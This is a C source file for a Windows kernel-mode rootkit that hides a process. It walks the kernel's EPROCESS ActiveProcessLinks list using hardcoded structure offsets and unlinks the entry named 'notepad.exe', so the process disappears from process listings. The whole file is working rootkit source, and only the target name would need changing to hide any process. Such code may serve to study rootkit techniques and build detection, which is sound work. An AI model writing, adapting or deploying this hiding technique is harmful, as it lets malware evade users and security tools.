#include "Rootkit.h"

VOID hideProcess(PLIST_ENTRY CurrentList) {
	PLIST_ENTRY PreviousList = CurrentList->Blink;
	PLIST_ENTRY NextList = CurrentList->Flink;

	//The previous "flink" must point to the Next
	//The Next "blink" must point to the previous
	PreviousList->Flink = NextList;
	NextList->Blink = PreviousList;

	//Remove my links.
	CurrentList->Flink = CurrentList;
	CurrentList->Blink = CurrentList;

	return;

}
/**
* Offsets:
*	+0x440 UniqueProcessId
*	+0x5a8 ImageFileName
*	+0x448 ActiveProcessLinks
*/
/**
* This function searches inside all the process list and hides the process with name "notepad.exe"
*/
VOID modifyTheList() {
	ULONG List_offset = 0x448;
	ULONG Filename_offset = 0x5a8;

	//get EEPROCESS Structure
	PEPROCESS CurrentEPROCESS = PsGetCurrentProcess();

	//Get list and Name pointers
	PLIST_ENTRY CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + List_offset);
	PUCHAR CurrentFileName = (PUCHAR)((ULONG_PTR)CurrentEPROCESS + Filename_offset);

	//Compare if it's the name of the process we want to hide
	KdPrint(("[0] The first process name I'm checking is: %s\n", CurrentFileName));
	KdPrint(("[0] Process Address is: %p\n",CurrentEPROCESS));
	KdPrint(("[0] List Address is: %p\n", CurrentList));
	
	if (strcmp((char*)CurrentFileName, "notepad.exe")==0) {
		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Hiding Process name is: %s", CurrentFileName));
		hideProcess(CurrentList);
		return;
	}
	
	//Store first process
	PEPROCESS FirstEPROCESS = CurrentEPROCESS;

	//Get Next process
	CurrentEPROCESS = (PEPROCESS)((ULONG_PTR)CurrentList->Flink - List_offset);
	CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + List_offset);
	CurrentFileName = (PUCHAR)CurrentEPROCESS + Filename_offset;
	KdPrint(("[0] Next Process Address is: %p\n", CurrentEPROCESS));

	ULONG iterator = 1;
	//Loop thorugh the list
	while ((PULONG)FirstEPROCESS != (PULONG)CurrentEPROCESS) {
		//Check if we want to hide
		//KdPrint(("The process name I'm checking is: %s\n", CurrentFileName));
		KdPrint(("[%d] Process Address is: %p\n", iterator, CurrentEPROCESS));
		KdPrint(("[%d] List Address is: %p\n", iterator, CurrentList));
		if (strcmp((char*)CurrentFileName, "notepad.exe")==0) {
			KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Hiding Process name is: %s\n",CurrentFileName));
			hideProcess(CurrentList);
			return;
		}

		//Update next
		CurrentEPROCESS = (PEPROCESS)((ULONG_PTR)CurrentList->Flink - List_offset);
		CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + List_offset);
		CurrentFileName = (PUCHAR)((ULONG_PTR)CurrentEPROCESS + Filename_offset);
		KdPrint(("[%d] Next process Address is: %p\n", iterator, CurrentEPROCESS));

		iterator++;
	}
	return;
}
